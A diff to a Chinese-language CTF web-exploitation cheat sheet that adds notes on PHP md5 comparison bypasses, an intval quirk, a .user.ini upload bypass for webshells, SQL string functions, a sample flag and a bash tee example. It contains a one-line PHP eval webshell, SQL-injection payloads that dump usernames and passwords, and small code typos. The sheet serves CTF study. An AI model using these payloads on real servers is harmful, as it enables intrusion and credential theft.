@@ -127,10 +127,51 @@ echo "<h1>Hello World</h1>";
 另外, url 大部分时候主要是编码和解码, 但是有些网站会使用加密, 注意区别, 以及 % 等特殊符号可能需要多次加密或者转义
 
 
+### md5 哈希碰撞
+
+#### 特殊字符串
+
+0e215962017 这个字符串md5后于自身弱比较相等
+
+ffifdyop md5 后变为万能密码: `' or '`
+
+#### 弱比较绕过
+
+当弱比较且哈希值都为 `0e` 开头, 将作为科学计数法处理, 又因为 0 的任意乘方都为零, 所以两个 `0e` 开头的字符串弱比较将会相等:
+
+常用碰撞:
+
+ `s878926199a` 和 `s155964671a`
+
+#### 强比较绕过
+
+传字符串则 md5 函数的返回结果为 null, 强比较 null === null , 通过;
+
+```php
+if($_POST['a']!==$_POST['b']&& md5($_POST['a'])===md5($_POST['b'])){
+	die("success!");
+}
+```
+
+只需要传入:
+
+```
+a[]=1&b[]=2
+```
+
 ### 一句话木马:
 
 ```php
 <?php @eval($_POST['shell']);?>
+```
+
+### intval 绕过
+
+`intval()` 的含义为取变量的整数值, 其逻辑为**左往右解析字符串里的数字, 直到遇到非数字字符为止**; 特例:
+
+```php
+intval(true) === 1
+intcal([123]) === 1 # 非空数组
 ```
 
 ### PHP 伪协议
@@ -845,13 +886,20 @@ GIF89a
 1. 抓包, 把 `Content-Type:` 改为 `image/jpg`
 2.  改后缀, 改文件头, 例如 jpg 的文件头 :`GIF89a`
 3.  windows 空格绕过: 原理是windows系统不允许最后一个字符是空格, 会自动去掉
-4.  (PHP>=5.3)利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有 `?.php` 可执行文件。所以本题我们要想上传并且执行，首先上传.user.ini文件，然后上传一个图片。
+
+#### user.ini 绕过
+
+(PHP>=5.3)利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有 `?.php` 可执行文件。所以本题我们要想上传并且执行，首先上传.user.ini文件，然后上传一个图片。
    
     来源:[csdn](https://blog.csdn.net/yuanxu8877/article/details/128071631)
 
     原理是.user.ini中会指定在同目录上传的其他 php 文件末尾都会 include 其中配置的指定文件, 比如这里就可以是 shell.jpg , (可能 .user.ini 本身设计的初衷是一个无管理员的为共享主机环境下的用户自定义需求)利用这个方式完成webshell (php解析)的上传. 
 
-    .user.ini 一共 include 两个选项: auto_prepend_file和auto_append_file, 一个在前面一个在后面
+    .user.ini 一共 include 两个选项: auto_prepend_file和auto_append_file, 一个在前面一个在后面:
+
+```php
+auto_prepend_file=shell.jpg
+```
 
     这个利用本质上是一个借刀杀人的过程, 只要服务器在该路径尝试加载并解析任何php源文件, 就会连同上传的 webshell 一起触发
 
@@ -905,6 +953,19 @@ SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_nam
 SELECT GROUP_CONCAT(username, ':', password) FROM users
 ```
 
+### 截取字符
+
+如:
+
+
+```sql
+substring(a,1,24) -- 操作字符串, 开始位置, 长度
+mid(a,1,20) -- 和mid 一样
+left(a,1,24) -- 操作字符串, 左端长度 (right 同理)
+```
+
+NSSCTF{29fdd4e6-0419-4132-9768-fe1a52c00f8c}
+
 ### 对 sqlite3 数据库的注入
 
 跟其他数据库结构略有不同:
@@ -950,3 +1011,12 @@ sqlite_master 表的结构包含以下几个字段：
 
 通常回显都只有一行, 要吧所有的内容挤在一起, 就要用group concat()这个函数
 
+## bash 指令
+
+### tee
+
+tee 指令作用为读取标准输入, 并输出到指定的文件, 最常见的用法:
+
+```bash
+command | tee file.txt
+```
